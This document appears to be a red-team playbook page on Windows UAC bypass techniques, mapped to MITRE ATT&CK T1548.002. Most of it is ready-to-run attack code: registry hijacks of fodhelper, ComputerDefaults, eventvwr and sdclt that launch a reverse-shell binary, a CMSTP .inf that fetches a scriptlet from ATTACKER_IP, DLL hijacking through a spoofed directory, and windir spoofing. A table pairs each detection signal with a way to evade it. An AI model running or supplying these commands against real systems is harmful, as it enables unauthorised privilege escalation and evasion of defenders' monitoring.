# UAC Bypass Techniques

> **MITRE ATT&CK**: Privilege Escalation > T1548.002 - Abuse Elevation Control Mechanism: Bypass UAC
> **Platforms**: Windows
> **Required Privileges**: Medium Integrity (local administrator group member, non-elevated)
> **OPSEC Risk**: Medium

## Strategic Overview

User Account Control (UAC) is not a security boundary per Microsoft's own definition, but
it is a practical barrier during engagements. A UAC bypass elevates a process from medium
integrity to high integrity without triggering a consent prompt. The prerequisite is that
the current user is already a member of the local Administrators group but running in a
non-elevated context. Understanding which bypass applies to which Windows version and UAC
setting is critical for a Red Team Lead -- using the wrong technique wastes time and may
trigger alerts.

### UAC Levels and Bypass Viability

| UAC Setting | Bypass Possible | Notes |
|------------|----------------|-------|
| Always Notify (highest) | No (most bypasses fail) | Only DLL hijacking in some cases |
| Notify me only when apps try to make changes (default) | Yes | Most bypasses work here |
| Notify me only (do not dim desktop) | Yes | Same as default, less visual cue |
| Never notify (disabled) | Not needed | Already auto-elevates |

Most bypasses target the default UAC level. Always verify the current level before attempting.

```cmd
:: Check current UAC configuration
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
:: Value 5 = default (bypasses work), Value 2 = always notify (most fail)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
:: Value 1 = UAC enabled, Value 0 = UAC disabled
```

## Technical Deep-Dive

### Fodhelper Bypass (Windows 10/11, Server 2016+)

Fodhelper.exe is a Microsoft binary that auto-elevates. It reads from a user-writable
registry key before execution, allowing command injection.

```powershell
# Set the registry key to hijack fodhelper.exe auto-elevation
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\temp\rev.exe" -Force

# Trigger the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup immediately after execution
Remove-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Recurse -Force
```

### ComputerDefaults Bypass (Windows 10)

Same registry-based principle as Fodhelper, using a different auto-elevated binary.

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd.exe /c C:\temp\rev.exe" -Force

Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Recurse -Force
```

### CMSTP Bypass (Windows 7-11)

CMSTP.exe (Connection Manager Service Profile Installer) can be abused via a specially
crafted .inf file that loads a COM scriptlet.

```ini
; cmstp_bypass.inf
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://ATTACKER_IP/payload.sct
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
```

```cmd
:: Execute bypass (requires interaction to dismiss a dialog or use COM interface)
cmstp.exe /s /ns /au C:\temp\cmstp_bypass.inf
```

### EventViewer Bypass (Windows 7-10)

The MMC Event Viewer snap-in reads from a user-controllable registry location.

```powershell
# Hijack the mmc.exe eventvwr.msc registry lookup
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c C:\temp\rev.exe" -Force

# Trigger Event Viewer (auto-elevates, reads hijacked key)
Start-Process "eventvwr.msc"

# Cleanup
Remove-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Recurse -Force
```

### sdclt.exe Bypass (Windows 10)

The Backup and Restore utility (sdclt.exe) auto-elevates and follows registry-based
redirection.

```powershell
# Create the registry hijack
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(default)" -Value "C:\temp\rev.exe" -Force

Start-Process "sdclt.exe" -WindowStyle Hidden

# Cleanup
Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Recurse -Force
```

### DLL Hijacking via Trusted Directory Spoofing

Some auto-elevating binaries load DLLs from specific directories. By creating a directory
that appears trusted (e.g., "C:\Windows \System32" with a trailing space), Windows treats
it as a trusted location.

```cmd
:: Create spoofed trusted directory (note trailing space in "Windows ")
mkdir "\\?\C:\Windows \System32"
:: Copy auto-elevating binary to spoofed directory
copy C:\Windows\System32\ComputerDefaults.exe "\\?\C:\Windows \System32\"
:: Place malicious DLL in spoofed directory (e.g., propsys.dll)
copy malicious.dll "\\?\C:\Windows \System32\propsys.dll"
:: Execute - auto-elevation applies, DLL loads from spoofed directory
"\\?\C:\Windows \System32\ComputerDefaults.exe"
```

### Environment Variable Spoofing

```powershell
# Some auto-elevated processes resolve %windir% from user-controllable env vars
# Set custom windir to redirect DLL loading
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd /c C:\temp\rev.exe &REM "
# Trigger the scheduled task that uses %windir%
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
# Cleanup
Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
```

### UACME Reference

The UACME project catalogs 70+ UAC bypass methods with implementation details. Use it as
a reference to match techniques to specific Windows builds.

```
# https://github.com/hfiref0x/UACME
# Akagi64.exe [method_number]
# Always verify the method supports the target Windows build
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| Registry key creation under HKCU\Software\Classes | Sysmon Event 12/13 | Delete keys immediately after execution |
| Auto-elevating binary spawning unexpected child | EDR parent-child analysis | Use less-monitored auto-elevating binaries |
| Fodhelper/ComputerDefaults spawning cmd.exe | Sysmon Event 1 process creation | Use direct payload execution, avoid cmd.exe |
| Unusual DLL loads in trusted directories | Sysmon Event 7 DLL load | Match legitimate DLL metadata and signing |
| CMSTP.exe loading remote resources | Network monitoring, proxy logs | Host SCT payload locally or use inline |

### OPSEC Decision: Bypass vs. Alternative Path

Before attempting a UAC bypass, consider:
- Is there a service running as SYSTEM you can exploit directly (avoids UAC entirely)?
- Can you use token impersonation from a service account context?
- Does the engagement timeline allow waiting for a scheduled elevated task?
- UAC bypasses leave registry artifacts -- is that acceptable for the engagement?

## Cross-References

- [Windows Local Privesc](windows-local-privesc.md) - broader Windows escalation techniques
- [Defense Evasion](../04-defense-evasion/README.md) - complementary evasion techniques
- [Credential Access](../06-credential-access/README.md) - post-escalation credential harvesting

## References

- https://github.com/hfiref0x/UACME
- https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
- https://blog.morphisec.com/uac-bypass-using-computerdefaults
- https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
- https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-techniques-ef310304a760
